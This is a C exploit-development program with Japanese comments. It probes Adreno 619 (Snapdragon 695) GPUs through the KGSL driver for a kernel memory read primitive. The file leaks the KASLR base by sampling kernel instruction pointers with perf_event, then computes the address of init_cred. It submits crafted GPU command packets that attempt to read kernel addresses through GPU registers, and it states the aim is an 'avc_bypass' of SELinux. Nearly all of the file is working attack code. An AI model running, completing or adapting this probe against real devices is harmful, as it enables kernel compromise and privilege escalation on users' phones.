#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738

#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73
#define CP_REG_TO_MEM 0x3E
#define CP_MEM_TO_REG 0x42

static int kgsl_fd = -1;

static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static int run_cmd(uint32_t *cmd, int dwords,
                   uint64_t ib_ga, void *ib_m,
                   unsigned int ctx_id, unsigned int ib_id) {
    memcpy(ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    __sync_synchronize();
    return 0;
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ============================================================================
 * テスト1: 既知のレジスタ値を読み出す (CP_REG_TO_MEM)
 * ============================================================================ */
static void test_reg_reads(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                           unsigned int ctx_id, unsigned int ib_id) {
    printf("[*] Testing CP_REG_TO_MEM for known registers\n");
    uint32_t regs[] = {
        0x00000400, 0x00000404, 0x00000408, 0x0000040C, 0x00000410,
        0x00000414, 0x00000418, 0x0000041C, 0x00000420, 0x00000424,
        0x00000428, 0x0000042C, 0x00000430, 0x00000434, 0x00000438,
        0x0000043C, 0x00000440, 0x00000444, 0x00000448, 0x0000044C,
        0x00000600, 0x00000604, 0x00000608, 0x0000060C, 0x00000610,
        0x00000800, 0x00000804, 0x00000808, 0x0000080C, 0x00000810,
        0x00000A00, 0x00000A04, 0x00000A08, 0x00000A0C, 0x00000A10,
        0x00000C00, 0x00000C04, 0x00000C08, 0x00000C0C, 0x00000C10,
    };
    for (int i = 0; i < sizeof(regs)/sizeof(regs[0]); i++) {
        uint32_t cmd[16];
        int dw = 0;
        uint32_t lo, hi;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = regs[i];
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        memset(dst_m, 0, 16);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            uint64_t val = *(uint64_t*)dst_m;
            if (val != 0)
                printf("  REG 0x%04X = 0x%016lx\n", regs[i], val);
        }
    }
}

/* ============================================================================
 * テスト2: CP_MEM_TO_REG でアドレスを設定し、CP_REG_TO_MEM で読み出す
 * ============================================================================ */
static void test_mem_to_reg_readback(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                                     unsigned int ctx_id, unsigned int ib_id,
                                     uint64_t test_addr) {
    printf("[*] Testing CP_MEM_TO_REG + CP_REG_TO_MEM readback with addr=0x%lx\n", test_addr);
    uint32_t regs[] = {0x00000408, 0x0000040C, 0x00000410, 0x00000414, 0x00000418,
                       0x0000041C, 0x00000420, 0x00000424, 0x00000428, 0x0000042C,
                       0x00000430, 0x00000434, 0x00000438, 0x0000043C, 0x00000440,
                       0x00000444, 0x00000448, 0x0000044C, 0x00000450, 0x00000454};
    for (int i = 0; i < sizeof(regs)/sizeof(regs[0]); i++) {
        uint32_t reg = regs[i];
        // Step 1: Write test_addr to DST
        uint32_t cmd[32];
        int dw = 0;
        uint32_t lo, hi;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = lo; cmd[dw++] = hi;
        split64(test_addr, &lo, &hi);
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) continue;

        // Step 2: CP_MEM_TO_REG (DST -> reg)
        dw = 0;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
        cmd[dw++] = reg;
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) continue;

        // Step 3: CP_REG_TO_MEM (reg -> DST+8)
        dw = 0;
        uint64_t dst2 = dst_ga + 8;
        split64(dst2, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = reg;
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        memset(dst_m, 0, 16);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            uint64_t val = *(uint64_t*)(dst_m + 8);
            if (val == test_addr) {
                printf("  REG 0x%04X: SUCCESS (readback matches)\n", reg);
            } else if (val != 0) {
                printf("  REG 0x%04X: readback=0x%016lx (not match)\n", reg, val);
            }
        }
    }
}

/* ============================================================================
 * テスト3: カーネルアドレス（init_cred）を読み出せるか
 * ============================================================================ */
static void test_kernel_read(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                             unsigned int ctx_id, unsigned int ib_id,
                             uint64_t kernel_addr, const char *name) {
    printf("[*] Testing kernel read for %s at 0x%lx\n", name, kernel_addr);
    uint32_t regs[] = {0x00000408, 0x0000040C, 0x00000410, 0x00000414, 0x00000418,
                       0x0000041C, 0x00000420, 0x00000424, 0x00000428, 0x0000042C,
                       0x00000430, 0x00000434, 0x00000438, 0x0000043C, 0x00000440};
    for (int i = 0; i < sizeof(regs)/sizeof(regs[0]); i++) {
        uint32_t reg = regs[i];
        uint32_t cmd[32];
        int dw = 0;
        uint32_t lo, hi;

        // Write kernel_addr to DST
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = lo; cmd[dw++] = hi;
        split64(kernel_addr, &lo, &hi);
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) continue;

        // DST -> reg
        dw = 0;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
        cmd[dw++] = reg;
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) continue;

        // reg -> DST+8
        dw = 0;
        uint64_t dst2 = dst_ga + 8;
        split64(dst2, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = reg;
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        memset(dst_m, 0, 16);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            uint64_t val = *(uint64_t*)(dst_m + 8);
            if (val != 0) {
                printf("  REG 0x%04X: read kernel %s = 0x%016lx\n", reg, name, val);
            }
        }
    }
}

/* ============================================================================
 * メイン
 * ============================================================================ */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== Read Primitive Probe for Adreno 619 (Snapdragon 695) ===\n");
    printf("[*] This probe tries to find a working read primitive for avc_bypass\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[+] KASLR = 0x%lx\n", kaslr);
    printf("[+] init_cred = 0x%lx\n", init_cred_addr);

    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    printf("[*] IB id=%d gpuaddr=0x%lx\n", ib_id, ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);
    printf("[*] DST id=%d gpuaddr=0x%lx\n", dst_id, dst_ga);

    unsigned int ctx_id = create_context();
    printf("[*] Context id=%u\n", ctx_id);

    // テスト1: レジスタ読み出し
    test_reg_reads(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);

    // テスト2: ユーザー空間アドレスをレジスタ経由で読み出し
    uint64_t user_test = (uint64_t)(uintptr_t)&user_test;
    test_mem_to_reg_readback(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, user_test);

    // テスト3: カーネルアドレスをレジスタ経由で読み出し
    test_kernel_read(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id,
                     init_cred_addr, "init_cred");
    test_kernel_read(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id,
                     init_cred_addr + 0x10, "init_cred+0x10");
    test_kernel_read(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id,
                     init_cred_addr + 0x78, "init_cred+0x78");

    // 追加: 固定カーネルアドレスも試す（KASLR があっても読めるか）
    test_kernel_read(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id,
                     0xFFFFFFC000000000ULL, "0xFFFFFFC000000000");
    test_kernel_read(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id,
                     0xFFFFFF8000000000ULL, "0xFFFFFF8000000000");

    close(kgsl_fd);
    printf("\n[*] Probe finished. If any register showed a non-zero value for kernel read, that register can be used as a read primitive.\n");
    return 0;
}
